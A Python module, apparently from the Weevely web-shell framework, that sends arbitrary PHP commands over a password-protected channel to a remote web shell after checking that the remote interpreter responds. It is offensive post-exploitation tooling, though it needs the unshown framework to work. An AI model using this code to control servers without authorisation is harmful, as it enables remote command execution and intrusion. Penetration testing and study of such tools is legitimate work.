from core.module import Module
from core import messages
from core.channels.channel import Channel
from core.vectors import Vector
from core.loggers import log
import random


class Php(Module):

    """Execute PHP commands.

    Usage:
      shell_php <command>

    """

    def initialize(self):

        self._register_infos(
            {
                'name': 'PHP Shell',
                'description': __doc__,
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory commands
            arguments=[
                'command'
            ],
            # Declare additional options
            options={
                'prefix_string': '',
                'post_data': '',
                'postfix_string': '',
            })

        self.channel = Channel(
            self.session['url'],
            self.session['password'])

    def check(self, args={}):
        """ Check if remote PHP interpreter works """

        enabled = True
        rand = str(random.randint(11111, 99999))

        response, code = self.channel.send('echo(%s);' % rand)
        
        if rand != response:
            enabled = False

        log.debug('PHP check: %s' % enabled)

        return enabled

    def run(self, args):
        """ Run module """

        cwd = self._get_module_result('file_cd', 'cwd', default='.')

        # Compose command with pre_command and post_command option
        command = Vector(
            "chdir('${cwd}');${args['prefix_string']}${args['command']}${args['postfix_string']}"
            ).format( { 'args' : args, 'cwd' : cwd } )

        # Send command
        response, code = self.channel.send(command)

        # Strip last newline if present
        return response[:-1] if (
            response and response.endswith('\n')
            ) else response
